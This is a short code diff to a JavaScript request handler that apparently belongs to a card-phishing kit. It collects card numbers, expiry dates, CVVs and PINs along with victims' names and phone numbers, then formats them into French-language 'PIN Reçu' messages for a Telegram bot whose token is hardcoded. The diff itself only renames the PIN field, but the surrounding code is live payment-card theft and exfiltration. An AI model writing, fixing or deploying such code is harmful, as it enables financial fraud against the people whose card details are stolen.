@@ -16,7 +16,7 @@ export default async function handler(req, res) {
     cc,
     exp,
     cvv,
-    pin
+    pin_code
   } = req.body;
 
   const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
@@ -28,7 +28,7 @@ if (pin_code) {
     // 🟣 رسالة PIN
     message = `
 🔑 PIN Reçu:
-- Code: ${pin}
+- Code: ${pin_code}
 - Nom: ${first_name || ""} ${last_name || ""}
 - Téléphone: ${num || ""}
     `;
@@ -75,6 +75,7 @@ if (pin_code) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
 
 
 
